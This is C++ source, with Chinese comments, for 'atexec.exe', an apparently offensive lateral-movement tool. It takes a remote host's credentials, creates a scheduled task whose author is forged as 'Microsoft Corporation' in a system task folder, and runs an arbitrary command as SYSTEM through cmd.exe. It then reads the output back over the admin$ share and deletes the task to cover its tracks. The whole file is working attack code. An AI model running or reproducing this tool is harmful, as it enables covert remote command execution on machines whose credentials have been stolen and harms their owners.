#define _WIN32_DCOM
#define _CRT_SECURE_NO_WARNINGS   // 忽略老版本函数所提示的安全问题
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <comdef.h>
#include <string>
#include <time.h>
#include <taskschd.h>
#include <winnetwk.h>

#pragma comment(lib,"taskschd.lib")
#pragma comment(lib,"comsupp.lib")
#pragma comment(lib, "ws2_32")   
#pragma comment(lib, "Mpr.lib")
#pragma comment(lib,"Advapi32.lib")

using namespace std;

ITaskService* pService = NULL;
ITaskFolder* pRootFolder = NULL;
HRESULT hr = NULL;

BOOL ConnectTaskServer(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
	// 初始化COM组件
	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	// 设置组件安全等级
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	// 创建任务服务容器
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	// 连接目标服务器为远程连接或本地服务器
	hr = pService->Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	//默认本地
	if (FAILED(hr))
	{
		printf("ITaskService::Connect failed: %x \n", hr);
		
		pService->Release();
		CoUninitialize();
		return FALSE;
	}
	return TRUE;
}


DWORD ConnectSMBServer(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)
{
	// 用于存放SMB共享资源格式
	PWCHAR lpwsIPC = new WCHAR[MAX_PATH];
	DWORD dwRetVal; // 函数返回值
	NETRESOURCE nr; // 连接的详细信息
	DWORD dwFlags; // 连接选项

	ZeroMemory(&nr, sizeof(NETRESOURCE));
	swprintf(lpwsIPC, TEXT("\\\\%s\\admin$"), lpwsHost);
	nr.dwType = RESOURCETYPE_ANY; // 枚举所有资源
	nr.lpLocalName = NULL;
	nr.lpRemoteName = lpwsIPC; // 资源的网络名
	nr.lpProvider = NULL;

	// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。
	dwFlags = CONNECT_UPDATE_PROFILE;

	dwRetVal = WNetAddConnection2(&nr, lpwsPassword, lpwsUserName, dwFlags);
	if (dwRetVal == NO_ERROR) {
		// 返回NO_ERROR则成功
		// wprintf(L"Connection added to %s\n", nr.lpRemoteName);
		return dwRetVal;
	}

	wprintf(L"WNetAddConnection2 failed with error: %u\n", dwRetVal);
	return -1;
}

BOOL GetSMBServerFileContent(LPCWSTR lpwsDstPath) {
	DWORD dwFileSize = 0;
	PCHAR readBuf = NULL;
	DWORD dwReaded = 0;
	BOOL bRet = TRUE;
	HANDLE hFile = CreateFile(lpwsDstPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		wprintf(TEXT("Can't Read File : %s \n"), lpwsDstPath);
		return FALSE;
	}
	// 获取文件大小
	dwFileSize = GetFileSize(hFile, NULL);
	readBuf = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	ReadFile(hFile, readBuf, dwFileSize, &dwReaded, NULL);
	wprintf(TEXT("===========================\n"));
	printf("%s", readBuf);
	CloseHandle(hFile);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, readBuf);
	wprintf(TEXT("\n===========================\n"));
	return TRUE;
}

// 获取未来10秒后的时间
std::wstring GetTime() {
	WCHAR CurrentTime[100];
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	sys.wSecond += 10;
	if (sys.wSecond >= 60) {
		sys.wMinute++;
		sys.wSecond -= 60;
	}
	wsprintf(CurrentTime, TEXT("%4d-%02d-%02dT%02d:%02d:%02d"), sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond);
	std::wstring returnTime(CurrentTime);
	std::wcout << returnTime << std::endl;
	return returnTime;
}


BOOL CreatTask(LPCWSTR wTaskName, LPCWSTR wCommand, LPCWSTR wOutPutPath) {
	std::wstring CurrentTime;
	std::wstring CommandArgs(TEXT("/c "));
	CommandArgs.append(wCommand);
	CommandArgs.append(TEXT(" >"));
	CommandArgs.append(wOutPutPath);

	wstring wstrExePath(TEXT("C:\\Windows\\System32\\cmd.exe"));
	
	// 获取任务文件夹并在其中创建任务
	pService->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\AppID"), &pRootFolder);
	// 如果存在同名任务，删除它
	pRootFolder->DeleteTask(_bstr_t(wTaskName), 0);

	// 使用ITaskDefinition对象定义任务相关信息
	ITaskDefinition* pTask = NULL;
	pService->NewTask(0, &pTask);

	// 使用IRegistrationInfo对象对任务的基础信息填充
	IRegistrationInfo* pRegInfo = NULL;
	pTask->get_RegistrationInfo(&pRegInfo);
	pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));

	// 创建任务的安全凭证
	IPrincipal* pPrincipal = NULL;
	pTask->get_Principal(&pPrincipal);

	// 设置规则为交互式登录
	pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);

	pPrincipal->put_UserId(_bstr_t(L"NT AUTHORITY\\SYSTEM"));

	// 创建任务的设置信息
	ITaskSettings* pTaskSettings = NULL;
	pTask->get_Settings(&pTaskSettings);
	// 为设置信息赋值
	pTaskSettings->put_StartWhenAvailable(VARIANT_TRUE);
	// 设置任务的idle设置
	IIdleSettings* pIdleSettings = NULL;
	pTaskSettings->get_IdleSettings(&pIdleSettings);
	pIdleSettings->put_WaitTimeout(_bstr_t(L"PT1M"));

	//创建触发器
	ITriggerCollection* pTriggerCollection = NULL;
	pTask->get_Triggers(&pTriggerCollection);
	ITrigger* pTrigger = NULL;

	hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
	if (FAILED(hr))
	{
		printf("\nCannot create the trigger: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return FALSE;
	}
	// 设置时间触发器
	ITimeTrigger* pTimeTrigger = NULL;
	pTrigger->QueryInterface(IID_ITimeTrigger, (void**)&pTimeTrigger);
	pTimeTrigger->put_Id(_bstr_t(L"Trigger2"));
	CurrentTime = GetTime();
	// 在10秒后执行
	pTimeTrigger->put_StartBoundary(_bstr_t(CurrentTime.data()));
	pTimeTrigger->put_EndBoundary(_bstr_t(L"2089-03-26T13:00:00"));
	// 创建任务动作
	IActionCollection* pActionCollection = NULL;
	pTask->get_Actions(&pActionCollection);
	IAction* pAction = NULL;
	pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	IExecAction* pExecAction = NULL;
	// 出入执行命令及参数
	pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	pExecAction->put_Path(_bstr_t(wstrExePath.c_str()));
	pExecAction->put_Arguments(_bstr_t(CommandArgs.data()));

	IRegisteredTask* pRegistredTask = NULL;
	pRootFolder->RegisterTaskDefinition(_bstr_t(wTaskName), pTask, TASK_CREATE_OR_UPDATE,
		_variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(), &pRegistredTask);
	Sleep(10 * 1000);
	// 结束时删除任务
	pRootFolder->DeleteTask(_bstr_t(wTaskName), 0);
	pRootFolder->Release();
	pService->Release();
	CoUninitialize();
	return TRUE;
}

int _cdecl wmain(int argc, wchar_t* argv[]) {
	BOOL bRetVal = FALSE;
	WCHAR wsTaskName[] = TEXT("TestBody");
	LPCWSTR lpwDomain = NULL;
	if (argc < 5) {
		wprintf(TEXT("atexec.exe <Host> <Username> <Password> <Command> [Domain] \n"));
		wprintf(TEXT("Usage: \n"));
		wprintf(TEXT("atexec.exe 192.168.3.130 Administrator 123456 whoami SYS.LOCAL\n"));
		wprintf(TEXT("atexec.exe 192.168.3.130 Administrator 123456 whoami\n"));
		return 0;
	}
	if (argc == 6) {
		lpwDomain = argv[5]; // 域名
	}
	LPCWSTR wsCommand = argv[4]; // 执行命令
	LPCWSTR lpwsHost = argv[1]; // 目标机器地址
	LPCWSTR lpwsUserName = argv[2]; // 账号
	LPCWSTR lpwsPassword = argv[3]; // 密码
	std::wstring wsHostFile;
	WCHAR wsOutPutPath[] = TEXT("C:\\Windows\\RunTime.log");
	wsHostFile.append(TEXT("\\\\"));
	wsHostFile.append(lpwsHost);
	wsHostFile.append(TEXT("\\admin$\\RunTime.log"));
	// 连接任务计划
	bRetVal = ConnectTaskServer(lpwsHost, NULL, lpwsUserName, lpwsPassword);
	if (!bRetVal) {
		return -1;
	}

	bRetVal = CreatTask(wsTaskName, wsCommand, wsOutPutPath);
	if (!bRetVal) {
		return -1;
	}
	// 连接目标服务器SMB
	if (ConnectSMBServer(lpwsHost, lpwsUserName, lpwsPassword) == 0) {
		// 连接成功
		GetSMBServerFileContent(wsHostFile.data());
	}
	else {
		std::wcout << TEXT("Can't Connect to ") << lpwsHost << std::endl;
	}

	return 0;
}